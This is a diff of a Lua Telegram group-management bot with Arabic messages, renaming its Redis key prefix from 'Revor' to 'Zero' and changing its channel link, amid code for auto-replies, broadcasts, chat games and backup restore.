+local video = Redis:get(Zero .."Zero :Add:Rd:Manager:Video"..text..msg_chat_id)
+local document = Redis:get(Zero .."Zero :Add:Rd:Manager:File"..text..msg_chat_id)
+local audio = Redis:get(Zero .."Zero :Add:Rd:Manager:Audio"..text..msg_chat_id)
+local video_note = Redis:get(Zero .."Zero :Add:Rd:Manager:video_note"..text..msg_chat_id)
 if Texingt then 
 local UserInfo = LuaTele.getUser(msg.sender.user_id)
-local NumMsg = Redis:get(Revor..'Revor:Num:Message:User'..msg_chat_id..':'..msg.sender.user_id) or 0
+local NumMsg = Redis:get(Zero ..'Zero :Num:Message:User'..msg_chat_id..':'..msg.sender.user_id) or 0
 local TotalMsg = Total_message(NumMsg) 
 local Status_Gps = msg.Name_Controller
-local NumMessageEdit = Redis:get(Revor..'Revor:Num:Message:Edit'..msg_chat_id..msg.sender.user_id) or 0
+local NumMessageEdit = Redis:get(Zero ..'Zero :Num:Message:Edit'..msg_chat_id..msg.sender.user_id) or 0
 local Texingt = Texingt:gsub('#username',(UserInfo.username or 'لا يوجد')) 
 local Texingt = Texingt:gsub('#name',UserInfo.first_name)
 local Texingt = Texingt:gsub('#id',msg.sender.user_id)
@@ -1682,34 +1685,34 @@ LuaTele.sendAudio(msg_chat_id, msg.id, audio, '', "md")
 end
 end
 if text then
-local test = Redis:get(Revor.."Revor:Text:Sudo:Bot"..msg.sender.user_id..":"..msg_chat_id)
-if Redis:get(Revor.."Revor:Set:Rd"..msg.sender.user_id..":"..msg_chat_id) == "true1" then
-Redis:del(Revor.."Revor:Set:Rd"..msg.sender.user_id..":"..msg_chat_id)
+local test = Redis:get(Zero .."Zero :Text:Sudo:Bot"..msg.sender.user_id..":"..msg_chat_id)
+if Redis:get(Zero .."Zero :Set:Rd"..msg.sender.user_id..":"..msg_chat_id) == "true1" then
+Redis:del(Zero .."Zero :Set:Rd"..msg.sender.user_id..":"..msg_chat_id)
 if msg.content.sticker then   
-Redis:set(Revor.."Revor:Add:Rd:Sudo:stekr"..test, msg.content.sticker.sticker.remote.id)  
+Redis:set(Zero .."Zero :Add:Rd:Sudo:stekr"..test, msg.content.sticker.sticker.remote.id)  
 end   
 if msg.content.voice_note then  
-Redis:set(Revor.."Revor:Add:Rd:Sudo:vico"..test, msg.content.voice_note.voice.remote.id)  
+Redis:set(Zero .."Zero :Add:Rd:Sudo:vico"..test, msg.content.voice_note.voice.remote.id)  
 end   
 if msg.content.animation then   
-Redis:set(Revor.."Revor:Add:Rd:Sudo:Gif"..test, msg.content.animation.animation.remote.id)  
+Redis:set(Zero .."Zero :Add:Rd:Sudo:Gif"..test, msg.content.animation.animation.remote.id)  
 end  
 if text then   
 text = text:gsub('"',"") 
 text = text:gsub('"',"") 
 text = text:gsub("`","") 
 text = text:gsub("*","") 
-Redis:set(Revor.."Revor:Add:Rd:Sudo:Text"..test, text)  
+Redis:set(Zero .."Zero :Add:Rd:Sudo:Text"..test, text)  
 end  
 LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم حفظ رد للمطور \n⌔︙ارسل ( "..test.." ) لرئية الرد","md",true)  
 return false
 end  
 end
 if text and text:match("^(.*)$") then
-if Redis:get(Revor.."Revor:Set:Rd"..msg.sender.user_id..":"..msg_chat_id) == "true" then
-Redis:set(Revor.."Revor:Set:Rd"..msg.sender.user_id..":"..msg_chat_id, "true1")
-Redis:set(Revor.."Revor:Text:Sudo:Bot"..msg.sender.user_id..":"..msg_chat_id, text)
-Redis:sadd(Revor.."Revor:List:Rd:Sudo", text)
+if Redis:get(Zero .."Zero :Set:Rd"..msg.sender.user_id..":"..msg_chat_id) == "true" then
+Redis:set(Zero .."Zero :Set:Rd"..msg.sender.user_id..":"..msg_chat_id, "true1")
+Redis:set(Zero .."Zero :Text:Sudo:Bot"..msg.sender.user_id..":"..msg_chat_id, text)
+Redis:sadd(Zero .."Zero :List:Rd:Sudo", text)
 LuaTele.sendText(msg_chat_id,msg_id,[[
 ↯︙ارسل لي الرد سواء كان 
 ❨ ملف • ملصق • متحركه • صوره
@@ -1728,22 +1731,22 @@ return false
 end
 end
 if text and text:match("^(.*)$") then
-if Redis:get(Revor.."Revor:Set:On"..msg.sender.user_id..":"..msg_chat_id) == "true" then
+if Redis:get(Zero .."Zero :Set:On"..msg.sender.user_id..":"..msg_chat_id) == "true" then
 list = {"Add:Rd:Sudo:video_note","Add:Rd:Sudo:Audio","Add:Rd:Sudo:File","Add:Rd:Sudo:Video","Add:Rd:Sudo:Photo","Add:Rd:Sudo:Text","Add:Rd:Sudo:stekr","Add:Rd:Sudo:vico","Add:Rd:Sudo:Gif"}
 for k,v in pairs(list) do
-Redis:del(Revor..'Revor:'..v..text)
+Redis:del(Zero ..'Zero :'..v..text)
 end
-Redis:del(Revor.."Revor:Set:On"..msg.sender.user_id..":"..msg_chat_id)
-Redis:srem(Revor.."Revor:List:Rd:Sudo", text)
+Redis:del(Zero .."Zero :Set:On"..msg.sender.user_id..":"..msg_chat_id)
+Redis:srem(Zero .."Zero :List:Rd:Sudo", text)
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم حذف الرد من ردود المطور","md",true)  
 end
 end
-if Redis:get(Revor.."Revor:Broadcasting:Groups:Pin" .. msg_chat_id .. ":" .. msg.sender.user_id) then 
+if Redis:get(Zero .."Zero :Broadcasting:Groups:Pin" .. msg_chat_id .. ":" .. msg.sender.user_id) then 
 if text == "الغاء" or text == 'الغاء الامر ⌔' then   
-Redis:del(Revor.."Revor:Broadcasting:Groups" .. msg_chat_id .. ":" .. msg.sender.user_id) 
+Redis:del(Zero .."Zero :Broadcasting:Groups" .. msg_chat_id .. ":" .. msg.sender.user_id) 
 return LuaTele.sendText(msg_chat_id,msg_id, "\n⌔︙تم الغاء الاذاعه للمجموعات","md",true)  
 end 
-local list = Redis:smembers(Revor.."Revor:ChekBotAdd") 
+local list = Redis:smembers(Zero .."Zero :ChekBotAdd") 
 if msg.content.video_note then
 for k,v in pairs(list) do 
 LuaTele.sendVideoNote(v, 0, msg.content.video_note.video.remote.id)
@@ -1789,155 +1792,155 @@ LuaTele.sendText(v,0,text,"md",true)
 end
 end
 LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تمت الاذاعه الى *- "..#list.." * مجموعه في البوت ","md",true)      
-Redis:del(Revor.."Revor:Broadcasting:Groups" .. msg_chat_id .. ":" .. msg.sender.user_id) 
+Redis:del(Zero .."Zero :Broadcasting:Groups" .. msg_chat_id .. ":" .. msg.sender.user_id) 
 return false
 end
 ------------------------------------------------------------------------------------------------------------
-if Redis:get(Revor.."Revor:Broadcasting:Groups:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id) then 
+if Redis:get(Zero .."Zero :Broadcasting:Groups:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id) then 
 if text == "الغاء" or text == 'الغاء الامر ⌔' then   
-Redis:del(Revor.."Revor:Broadcasting:Groups:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id) 
+Redis:del(Zero .."Zero :Broadcasting:Groups:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id) 
 return LuaTele.sendText(msg_chat_id,msg_id, "\n⌔︙تم الغاء الاذاعه بالتوجيه للمجموعات","md",true)    
 end 
 if msg.forward_info then 
-local list = Redis:smembers(Revor.."Revor:ChekBotAdd")   
+local list = Redis:smembers(Zero .."Zero :ChekBotAdd")   
 LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم التوجيه الى *- "..#list.." * مجموعه في البوت ","md",true)      
 for k,v in pairs(list) do  
 LuaTele.forwardMessages(v, msg_chat_id, msg_id,0,0,true,false,false)
 end   
-Redis:del(Revor.."Revor:Broadcasting:Groups:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id) 
+Redis:del(Zero .."Zero :Broadcasting:Groups:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id) 
 end 
 return false
 end
 ------------------------------------------------------------------------------------------------------------
-if Redis:get(Revor.."Revor:Broadcasting:Users:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id) then 
+if Redis:get(Zero .."Zero :Broadcasting:Users:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id) then 
 if text == "الغاء" or text == 'الغاء الامر ⌔' then   
-Redis:del(Revor.."Revor:Broadcasting:Users:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id) 
+Redis:del(Zero .."Zero :Broadcasting:Users:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id) 
 return LuaTele.sendText(msg_chat_id,msg_id, "\n⌔︙تم الغاء الاذاعه بالتوجيه خاص","md",true)    
 end 
 if msg.forward_info then 
-local list = Redis:smembers(Revor.."Revor:Num:User:Pv")   
+local list = Redis:smembers(Zero .."Zero :Num:User:Pv")   
 LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم التوجيه الى *- "..#list.." * مجموعه في البوت ","md",true) 
 for k,v in pairs(list) do  
 LuaTele.forwardMessages(v, msg_chat_id, msg_id,0,1,msg.media_album_id,false,true)
 end   
-Redis:del(Revor.."Revor:Broadcasting:Users:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id) 
+Redis:del(Zero .."Zero :Broadcasting:Users:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id) 
 end 
 return false
 end
-if text and Redis:get(Revor..'Revor:GetTexting:DevRevor'..msg_chat_id..':'..msg.sender.user_id) then
+if text and Redis:get(Zero ..'Zero :GetTexting:DevZero '..msg_chat_id..':'..msg.sender.user_id) then
 if text == 'الغاء' or text == 'الغاء الامر ⌔' then 
-Redis:del(Revor..'Revor:GetTexting:DevRevor'..msg_chat_id..':'..msg.sender.user_id)
+Redis:del(Zero ..'Zero :GetTexting:DevZero '..msg_chat_id..':'..msg.sender.user_id)
 return LuaTele.sendText(msg_chat_id,msg_id,'⌔︙تم الغاء حفظ كليشة المطور')
 end
-Redis:set(Revor..'Revor:Texting:DevRevor',text)
-Redis:del(Revor..'Revor:GetTexting:DevRevor'..msg_chat_id..':'..msg.sender.user_id)
+Redis:set(Zero ..'Zero :Texting:DevZero ',text)
+Redis:del(Zero ..'Zero :GetTexting:DevZero '..msg_chat_id..':'..msg.sender.user_id)
 return LuaTele.sendText(msg_chat_id,msg_id,'⌔︙تم حفظ كليشة المطور')
 end
-if Redis:get(Revor.."Revor:Redis:Id:Groups"..msg.chat_id..""..msg.sender.user_id) then 
+if Redis:get(Zero .."Zero :Redis:Id:Groups"..msg.chat_id..""..msg.sender.user_id) then 
 if text == 'الغاء' then 
 LuaTele.sendText(msg_chat_id,msg_id, "\n⌔︙تم الغاء امر تعين الايدي عام","md",true)  
-Redis:del(Revor.."Revor:Redis:Id:Groups"..msg.chat_id..""..msg.sender.user_id) 
+Redis:del(Zero .."Zero :Redis:Id:Groups"..msg.chat_id..""..msg.sender.user_id) 
 return false  
 end 
-Redis:del(Revor.."Revor:Redis:Id:Groups"..msg.chat_id..""..msg.sender.user_id) 
-Redis:set(Revor.."Revor:Set:Id:Groups",text:match("(.*)"))
+Redis:del(Zero .."Zero :Redis:Id:Groups"..msg.chat_id..""..msg.sender.user_id) 
+Redis:set(Zero .."Zero :Set:Id:Groups",text:match("(.*)"))
 LuaTele.sendText(msg_chat_id,msg_id,'⌔︙تم تعين الايدي عام',"md",true)  
 end
-if Redis:get(Revor.."Revor:Redis:Id:Group"..msg.chat_id..""..msg.sender.user_id) then 
+if Redis:get(Zero .."Zero :Redis:Id:Group"..msg.chat_id..""..msg.sender.user_id) then 
 if text == 'الغاء' then 
 LuaTele.sendText(msg_chat_id,msg_id, "\n⌔︙تم الغاء امر تعين الايدي","md",true)  
-Redis:del(Revor.."Revor:Redis:Id:Group"..msg.chat_id..""..msg.sender.user_id) 
+Redis:del(Zero .."Zero :Redis:Id:Group"..msg.chat_id..""..msg.sender.user_id) 
 return false  
 end 
-Redis:del(Revor.."Revor:Redis:Id:Group"..msg.chat_id..""..msg.sender.user_id) 
-Redis:set(Revor.."Revor:Set:Id:Group"..msg.chat_id,text:match("(.*)"))
+Redis:del(Zero .."Zero :Redis:Id:Group"..msg.chat_id..""..msg.sender.user_id) 
+Redis:set(Zero .."Zero :Set:Id:Group"..msg.chat_id,text:match("(.*)"))
 LuaTele.sendText(msg_chat_id,msg_id,'⌔︙تم تعين الايدي الجديد',"md",true)  
 end
-if Redis:get(Revor.."Revor:Change:Name:Bot"..msg.sender.user_id) then 
+if Redis:get(Zero .."Zero :Change:Name:Bot"..msg.sender.user_id) then 
 if text == "الغاء" or text == 'الغاء الامر ⌔' then   
-Redis:del(Revor.."Revor:Change:Name:Bot"..msg.sender.user_id) 
+Redis:del(Zero .."Zero :Change:Name:Bot"..msg.sender.user_id) 
 return LuaTele.sendText(msg_chat_id,msg_id, "\n⌔︙تم الغاء امر تغير اسم البوت","md",true)  
 end 
-Redis:del(Revor.."Revor:Change:Name:Bot"..msg.sender.user_id) 
-Redis:set(Revor.."Revor:Name:Bot",text) 
+Redis:del(Zero .."Zero :Change:Name:Bot"..msg.sender.user_id) 
+Redis:set(Zero .."Zero :Name:Bot",text) 
 return LuaTele.sendText(msg_chat_id,msg_id, "⌔︙ تم تغير اسم البوت الى - "..text,"md",true)    
 end 
-if Redis:get(Revor.."Revor:Change:Start:Bot"..msg.sender.user_id) then 
+if Redis:get(Zero .."Zero :Change:Start:Bot"..msg.sender.user_id) then 
 if text == "الغاء" or text == 'الغاء الامر ⌔' then   
-Redis:del(Revor.."Revor:Change:Start:Bot"..msg.sender.user_id) 
+Redis:del(Zero .."Zero :Change:Start:Bot"..msg.sender.user_id) 
 return LuaTele.sendText(msg_chat_id,msg_id, "\n⌔︙تم الغاء امر تغير كليشه start","md",true)  
 end 
-Redis:del(Revor.."Revor:Change:Start:Bot"..msg.sender.user_id) 
-Redis:set(Revor.."Revor:Start:Bot",text) 
+Redis:del(Zero .."Zero :Change:Start:Bot"..msg.sender.user_id) 
+Redis:set(Zero .."Zero :Start:Bot",text) 
 return LuaTele.sendText(msg_chat_id,msg_id, "⌔︙ تم تغيير كليشه start - "..text,"md",true)    
 end 
-if Redis:get(Revor.."Revor:Game:Smile"..msg.chat_id) then
-if text == Redis:get(Revor.."Revor:Game:Smile"..msg.chat_id) then
-Redis:incrby(Revor.."Revor:Num:Add:Games"..msg.chat_id..msg.sender.user_id, 1)  
-Redis:del(Revor.."Revor:Game:Smile"..msg.chat_id)
+if Redis:get(Zero .."Zero :Game:Smile"..msg.chat_id) then
+if text == Redis:get(Zero .."Zero :Game:Smile"..msg.chat_id) then
+Redis:incrby(Zero .."Zero :Num:Add:Games"..msg.chat_id..msg.sender.user_id, 1)  
+Redis:del(Zero .."Zero :Game:Smile"..msg.chat_id)
 return LuaTele.sendText(msg_chat_id,msg_id,"\n⌔︙لقد فزت في اللعبه \n⌔︙اللعب مره اخره وارسل - سمايل او سمايلات","md",true)  
 else
-Redis:del(Revor.."Revor:Game:Smile"..msg.chat_id)
+Redis:del(Zero .."Zero :Game:Smile"..msg.chat_id)
 return LuaTele.sendText(msg_chat_id,msg_id,"\n⌔︙لقد خسرت حضا اوفر في المره القادمه\n⌔︙اللعب مره اخره وارسل - سمايل او سمايلات","md",true)  
 end
 end 
-if Redis:get(Revor.."Revor:Game:Monotonous"..msg.chat_id) then
-if text == Redis:get(Revor.."Revor:Game:Monotonous"..msg.chat_id) then
-Redis:del(Revor.."Revor:Game:Monotonous"..msg.chat_id)
-Redis:incrby(Revor.."Revor:Num:Add:Games"..msg.chat_id..msg.sender.user_id, 1)  
+if Redis:get(Zero .."Zero :Game:Monotonous"..msg.chat_id) then
+if text == Redis:get(Zero .."Zero :Game:Monotonous"..msg.chat_id) then
+Redis:del(Zero .."Zero :Game:Monotonous"..msg.chat_id)
+Redis:incrby(Zero .."Zero :Num:Add:Games"..msg.chat_id..msg.sender.user_id, 1)  
 return LuaTele.sendText(msg_chat_id,msg_id,"\n⌔︙لقد فزت في اللعبه \n⌔︙اللعب مره اخره وارسل - الاسرع او ترتيب","md",true)  
 else
-Redis:del(Revor.."Revor:Game:Monotonous"..msg.chat_id)
+Redis:del(Zero .."Zero :Game:Monotonous"..msg.chat_id)
 return LuaTele.sendText(msg_chat_id,msg_id,"\n⌔︙لقد خسرت حضا اوفر في المره القادمه\n⌔︙اللعب مره اخره وارسل - الاسرع او ترتيب","md",true)  
 end
 end 
-if Redis:get(Revor.."Revor:Game:Riddles"..msg.chat_id) then
-if text == Redis:get(Revor.."Revor:Game:Riddles"..msg.chat_id) then
-Redis:incrby(Revor.."Revor:Num:Add:Games"..msg.chat_id..msg.sender.user_id, 1)  
-Redis:del(Revor.."Revor:Game:Riddles"..msg.chat_id)
+if Redis:get(Zero .."Zero :Game:Riddles"..msg.chat_id) then
+if text == Redis:get(Zero .."Zero :Game:Riddles"..msg.chat_id) then
+Redis:incrby(Zero .."Zero :Num:Add:Games"..msg.chat_id..msg.sender.user_id, 1)  
+Redis:del(Zero .."Zero :Game:Riddles"..msg.chat_id)
 return LuaTele.sendText(msg_chat_id,msg_id,"\n⌔︙لقد فزت في اللعبه \n⌔︙اللعب مره اخره وارسل - حزوره","md",true)  
 else
-Redis:del(Revor.."Revor:Game:Riddles"..msg.chat_id)
+Redis:del(Zero .."Zero :Game:Riddles"..msg.chat_id)
 return LuaTele.sendText(msg_chat_id,msg_id,"\n⌔︙لقد خسرت حضا اوفر في المره القادمه\n⌔︙اللعب مره اخره وارسل - حزوره","md",true)  
 end
 end
-if Redis:get(Revor.."Revor:Game:Meaningof"..msg.chat_id) then
-if text == Redis:get(Revor.."Revor:Game:Meaningof"..msg.chat_id) then
-Redis:incrby(Revor.."Revor:Num:Add:Games"..msg.chat_id..msg.sender.user_id, 1)  
-Redis:del(Revor.."Revor:Game:Meaningof"..msg.chat_id)
+if Redis:get(Zero .."Zero :Game:Meaningof"..msg.chat_id) then
+if text == Redis:get(Zero .."Zero :Game:Meaningof"..msg.chat_id) then
+Redis:incrby(Zero .."Zero :Num:Add:Games"..msg.chat_id..msg.sender.user_id, 1)  
+Redis:del(Zero .."Zero :Game:Meaningof"..msg.chat_id)
 return LuaTele.sendText(msg_chat_id,msg_id,"\n⌔︙لقد فزت في اللعبه \n⌔︙اللعب مره اخره وارسل - معاني","md",true)  
 else
-Redis:del(Revor.."Revor:Game:Meaningof"..msg.chat_id)
+Redis:del(Zero .."Zero :Game:Meaningof"..msg.chat_id)
 return LuaTele.sendText(msg_chat_id,msg_id,"\n⌔︙لقد خسرت حضا اوفر في المره القادمه\n⌔︙اللعب مره اخره وارسل - معاني","md",true)  
 end
 end
-if Redis:get(Revor.."Revor:Game:Reflection"..msg.chat_id) then
-if text == Redis:get(Revor.."Revor:Game:Reflection"..msg.chat_id) then
-Redis:incrby(Revor.."Revor:Num:Add:Games"..msg.chat_id..msg.sender.user_id, 1)  
-Redis:del(Revor.."Revor:Game:Reflection"..msg.chat_id)
+if Redis:get(Zero .."Zero :Game:Reflection"..msg.chat_id) then
+if text == Redis:get(Zero .."Zero :Game:Reflection"..msg.chat_id) then
+Redis:incrby(Zero .."Zero :Num:Add:Games"..msg.chat_id..msg.sender.user_id, 1)  
+Redis:del(Zero .."Zero :Game:Reflection"..msg.chat_id)
 return LuaTele.sendText(msg_chat_id,msg_id,"\n⌔︙لقد فزت في اللعبه \n⌔︙اللعب مره اخره وارسل - العكس","md",true)  
 else
-Redis:del(Revor.."Revor:Game:Reflection"..msg.chat_id)
+Redis:del(Zero .."Zero :Game:Reflection"..msg.chat_id)
 return LuaTele.sendText(msg_chat_id,msg_id,"\n⌔︙لقد خسرت حضا اوفر في المره القادمه\n⌔︙اللعب مره اخره وارسل - العكس","md",true)  
 end
 end
-if Redis:get(Revor.."Revor:Game:Estimate"..msg.chat_id..msg.sender.user_id) then  
+if Redis:get(Zero .."Zero :Game:Estimate"..msg.chat_id..msg.sender.user_id) then  
 if text and text:match("^(%d+)$") then
 local NUM = text:match("^(%d+)$")
 if tonumber(NUM) > 20 then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙عذرآ لا يمكنك تخمين عدد اكبر من ال { 20 } خمن رقم ما بين ال{ 1 و 20 }\n","md",true)  
 end 
-local GETNUM = Redis:get(Revor.."Revor:Game:Estimate"..msg.chat_id..msg.sender.user_id)
+local GETNUM = Redis:get(Zero .."Zero :Game:Estimate"..msg.chat_id..msg.sender.user_id)
 if tonumber(NUM) == tonumber(GETNUM) then
-Redis:del(Revor.."Revor:SADD:NUM"..msg.chat_id..msg.sender.user_id)
-Redis:del(Revor.."Revor:Game:Estimate"..msg.chat_id..msg.sender.user_id)
-Redis:incrby(Revor.."Revor:Num:Add:Games"..msg.chat_id..msg.sender.user_id,5)  
+Redis:del(Zero .."Zero :SADD:NUM"..msg.chat_id..msg.sender.user_id)
+Redis:del(Zero .."Zero :Game:Estimate"..msg.chat_id..msg.sender.user_id)
+Redis:incrby(Zero .."Zero :Num:Add:Games"..msg.chat_id..msg.sender.user_id,5)  
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙مبروك فزت ويانه وخمنت الرقم الصحيح\n🚸︙تم اضافة { 5 } من النقاط \n","md",true)  
 elseif tonumber(NUM) ~= tonumber(GETNUM) then
-Redis:incrby(Revor.."Revor:SADD:NUM"..msg.chat_id..msg.sender.user_id,1)
-if tonumber(Redis:get(Revor.."Revor:SADD:NUM"..msg.chat_id..msg.sender.user_id)) >= 3 then
-Redis:del(Revor.."Revor:SADD:NUM"..msg.chat_id..msg.sender.user_id)
-Redis:del(Revor.."Revor:Game:Estimate"..msg.chat_id..msg.sender.user_id)
+Redis:incrby(Zero .."Zero :SADD:NUM"..msg.chat_id..msg.sender.user_id,1)
+if tonumber(Redis:get(Zero .."Zero :SADD:NUM"..msg.chat_id..msg.sender.user_id)) >= 3 then
+Redis:del(Zero .."Zero :SADD:NUM"..msg.chat_id..msg.sender.user_id)
+Redis:del(Zero .."Zero :Game:Estimate"..msg.chat_id..msg.sender.user_id)
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙اوبس لقد خسرت في اللعبه \n⌔︙حظآ اوفر في المره القادمه \n⌔︙كان الرقم الذي تم تخمينه { "..GETNUM.." }","md",true)  
 else
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙اوبس تخمينك غلط \n⌔︙ارسل رقم تخمنه مره اخرى ","md",true)  
@@ -1945,28 +1948,28 @@ end
 end
 end
 end
-if Redis:get(Revor.."Revor:Game:Difference"..msg.chat_id) then
-if text == Redis:get(Revor.."Revor:Game:Difference"..msg.chat_id) then 
-Redis:del(Revor.."Revor:Game:Difference"..msg.chat_id)
-Redis:incrby(Revor.."Revor:Num:Add:Games"..msg.chat_id..msg.sender.user_id, 1)  
+if Redis:get(Zero .."Zero :Game:Difference"..msg.chat_id) then
+if text == Redis:get(Zero .."Zero :Game:Difference"..msg.chat_id) then 
+Redis:del(Zero .."Zero :Game:Difference"..msg.chat_id)
+Redis:incrby(Zero .."Zero :Num:Add:Games"..msg.chat_id..msg.sender.user_id, 1)  
 return LuaTele.sendText(msg_chat_id,msg_id,"\n⌔︙لقد فزت في اللعبه \n⌔︙اللعب مره اخره وارسل - المختلف","md",true)  
 else
-Redis:del(Revor.."Revor:Game:Difference"..msg.chat_id)
+Redis:del(Zero .."Zero :Game:Difference"..msg.chat_id)
 return LuaTele.sendText(msg_chat_id,msg_id,"\n⌔︙لقد خسرت حضا اوفر في المره القادمه\n⌔︙اللعب مره اخره وارسل - المختلف","md",true)  
 end
 end
-if Redis:get(Revor.."Revor:Game:Example"..msg.chat_id) then
-if text == Redis:get(Revor.."Revor:Game:Example"..msg.chat_id) then 
-Redis:del(Revor.."Revor:Game:Example"..msg.chat_id)
-Redis:incrby(Revor.."Revor:Num:Add:Games"..msg.chat_id..msg.sender.user_id, 1)  
+if Redis:get(Zero .."Zero :Game:Example"..msg.chat_id) then
+if text == Redis:get(Zero .."Zero :Game:Example"..msg.chat_id) then 
+Redis:del(Zero .."Zero :Game:Example"..msg.chat_id)
+Redis:incrby(Zero .."Zero :Num:Add:Games"..msg.chat_id..msg.sender.user_id, 1)  
 return LuaTele.sendText(msg_chat_id,msg_id,"\n⌔︙لقد فزت في اللعبه \n⌔︙اللعب مره اخره وارسل - امثله","md",true)  
 else
-Redis:del(Revor.."Revor:Game:Example"..msg.chat_id)
+Redis:del(Zero .."Zero :Game:Example"..msg.chat_id)
 return LuaTele.sendText(msg_chat_id,msg_id,"\n⌔︙لقد خسرت حضا اوفر في المره القادمه\n⌔︙اللعب مره اخره وارسل - امثله","md",true)  
 end
 end
 if text then
-local NewCmmd = Redis:get(Revor.."Revor:All:Get:Reides:Commands:Group"..text) or Redis:get(Revor.."Revor:Get:Reides:Commands:Group"..msg_chat_id..":"..text)
+local NewCmmd = Redis:get(Zero .."Zero :All:Get:Reides:Commands:Group"..text) or Redis:get(Zero .."Zero :Get:Reides:Commands:Group"..msg_chat_id..":"..text)
 if NewCmmd then
 text = (NewCmmd or text)
 end
@@ -1976,7 +1979,7 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
 local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
@@ -1990,42 +1993,42 @@ local File = json:decode(https.request('https://api.telegram.org/bot'..Token..'/
 local download_ = download('https://api.telegram.org/file/bot'..Token..'/'..File.result.file_path,''..Name_File) 
 local Get_Info = io.open(download_,"r"):read('*a')
 local FilesJson = JSON.decode(Get_Info)
-if tonumber(Revor) ~= tonumber(FilesJson.BotId) then
+if tonumber(Zero ) ~= tonumber(FilesJson.BotId) then
 return LuaTele.sendText(msg_chat_id,msg_id,'⌔︙عذرا هاذا الملف غير مطابق مع البوت يرجى جلب النسخه الحقيقيه')
 end -- end botid
 LuaTele.sendText(msg_chat_id,msg_id,'⌔︙جاري استرجاع المشتركين والكروبات ...')
 Y = 0
 for k,v in pairs(FilesJson.UsersBot) do
 Y = Y + 1
-Redis:sadd(Revor..'Revor:Num:User:Pv',v)  
+Redis:sadd(Zero ..'Zero :Num:User:Pv',v)  
 end
 X = 0
 for GroupId,ListGroup in pairs(FilesJson.GroupsBot) do
 X = X + 1
-Redis:sadd(Revor.."Revor:ChekBotAdd",GroupId) 
+Redis:sadd(Zero .."Zero :ChekBotAdd",GroupId) 
 if ListGroup.President then
 for k,v in pairs(ListGroup.President) do
-Redis:sadd(Revor.."Revor:TheBasics:Group"..GroupId,v)
+Redis:sadd(Zero .."Zero :TheBasics:Group"..GroupId,v)
 end
 end
 if ListGroup.Constructor then
 for k,v in pairs(ListGroup.Constructor) do
-Redis:sadd(Revor.."Revor:Originators:Group"..GroupId,v)
+Redis:sadd(Zero .."Zero :Originators:Group"..GroupId,v)
 end
 end
 if ListGroup.Manager then
 for k,v in pairs(ListGroup.Manager) do
-Redis:sadd(Revor.."Revor:Managers:Group"..GroupId,v)
+Redis:sadd(Zero .."Zero :Managers:Group"..GroupId,v)
 end
 end
 if ListGroup.Admin then
 for k,v in pairs(ListGroup.Admin) do
-Redis:sadd(Revor.."Revor:Addictive:Group"..GroupId,v)
+Redis:sadd(Zero .."Zero :Addictive:Group"..GroupId,v)
 end
 end
 if ListGroup.Vips then
 for k,v in pairs(ListGroup.Vips) do
-Redis:sadd(Revor.."Revor:Distinguished:Group"..GroupId,v)
+Redis:sadd(Zero .."Zero :Distinguished:Group"..GroupId,v)
 end
 end 
 end
@@ -2040,7 +2043,7 @@ local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
 if Message_Reply.content.document then
 local File_Id = Message_Reply.content.document.document.remote.id
 local Name_File = Message_Reply.content.document.file_name
-if tonumber(Name_File:match('(%d+)')) ~= tonumber(Revor) then 
+if tonumber(Name_File:match('(%d+)')) ~= tonumber(Zero ) then 
 return LuaTele.sendText(msg_chat_id,msg_id,'⌔︙عذرا هاذا الملف غير مطابق مع البوت يرجى جلب النسخه الحقيقيه')
 end -- end Namefile
 local File = json:decode(https.request('https://api.telegram.org/bot'..Token..'/getfile?file_id='..File_Id)) 
@@ -2049,22 +2052,22 @@ local Get_Info = io.open(download_,"r"):read('*a')
 local All_Groups = JSON.decode(Get_Info)
 if All_Groups.GP_BOT then
 for idg,v in pairs(All_Groups.GP_BOT) do
-Redis:sadd(Revor.."Revor:ChekBotAdd",idg) 
+Redis:sadd(Zero .."Zero :ChekBotAdd",idg) 
 if v.MNSH then
 for k,idmsh in pairs(v.MNSH) do
-Redis:sadd(Revor.."Revor:Originators:Group"..idg,idmsh)
+Redis:sadd(Zero .."Zero :Originators:Group"..idg,idmsh)
 end;end
 if v.MDER then
 for k,idmder in pairs(v.MDER) do
-Redis:sadd(Revor.."Revor:Managers:Group"..idg,idmder)  
+Redis:sadd(Zero .."Zero :Managers:Group"..idg,idmder)  
 end;end
 if v.MOD then
 for k,idmod in pairs(v.MOD) do
-Redis:sadd(Revor.."Revor:Addictive:Group"..idg,idmod)
+Redis:sadd(Zero .."Zero :Addictive:Group"..idg,idmod)
 end;end
 if v.ASAS then
 for k,idASAS in pairs(v.ASAS) do
-Redis:sadd(Revor.."Revor:TheBasics:Group"..idg,idASAS)
+Redis:sadd(Zero .."Zero :TheBasics:Group"..idg,idASAS)
 end;end
